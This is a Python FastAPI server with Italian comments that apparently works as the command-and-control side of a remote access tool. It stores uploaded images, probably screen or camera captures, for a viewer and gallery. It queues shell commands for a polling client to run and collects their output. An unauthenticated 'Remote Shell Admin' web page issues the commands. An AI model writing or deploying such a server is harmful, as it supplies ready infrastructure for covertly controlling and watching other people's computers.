
from fastapi import FastAPI, UploadFile, File, Form
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.requests import Request
import shutil
import os

app = FastAPI()

# Static files (to serve the latest image)
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

@app.post("/upload-image")
async def upload_image(file: UploadFile = File(...)):
    content = await file.read()
    print(f"Ricevuto file: {file.filename}, size: {len(content)} bytes")

    with open("static/latest.jpg", "wb") as f:
        f.write(content)
    
    return {"status": "ok"}


@app.get("/viewer", response_class=HTMLResponse)
async def get_viewer(request: Request):
    return templates.TemplateResponse("viewer.html", {"request": request})


@app.get("/gallery", response_class=HTMLResponse)
async def get_gallery(request: Request):
    images = sorted(
        [f for f in os.listdir("static") if f.endswith(".jpg") and f != "latest.jpg"],
        reverse=True
    )
    return templates.TemplateResponse("gallery.html", {"request": request, "images": images})

current_command = ""
last_output = ""

@app.post("/set-command")
async def set_command(command: str = Form(...)):
    global current_command
    current_command = command
    return {"status": "ok"}

@app.get("/command")
async def get_command():
    global current_command
    cmd = current_command
    current_command = ""
    return cmd

@app.post("/command-result")
async def receive_result(output: str = Form(...)):
    global last_output
    last_output = output
    return {"status": "received"}

@app.get("/command-result")
async def get_result():
    return {"output": last_output}

# --------------------------
# ✅ INTERFACCIA /admin
# --------------------------
@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    return """
    <html>
    <head>
        <title>Remote Shell Admin</title>
        <style>
            body { font-family: monospace; background: #111; color: #eee; padding: 2rem; }
            textarea, input { width: 100%; margin-top: 1rem; background: #222; color: #0f0; border: none; padding: 0.5rem; font-family: monospace; }
            button { background: #444; color: white; padding: 0.5rem 1rem; margin-top: 1rem; }
        </style>
        <script>
            async function sendCommand() {
                const cmd = document.getElementById('command').value;
                await fetch('/set-command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'command=' + encodeURIComponent(cmd)
                });
                document.getElementById('output').value = "In attesa di risposta...";
                setTimeout(fetchOutput, 5000);
            }

            async function fetchOutput() {
                const res = await fetch('/command-result');
                const json = await res.json();
                document.getElementById('output').value = json.output;
            }
        </script>
    </head>
    <body>
        <h2>Remote CMD</h2>
        <input type="text" id="command" placeholder="Inserisci comando shell (es: ipconfig)" />
        <button onclick="sendCommand()">Invia Comando</button>
        <textarea id="output" rows="20" placeholder="Output del client..."></textarea>
    </body>
    </html>
    """


@app.get("/", response_class=HTMLResponse)
async def root():
    return '<h2>✅ Server attivo. Vai su <a href="/viewer">/viewer</a> o <a href="/gallery">/gallery</a></h2>'
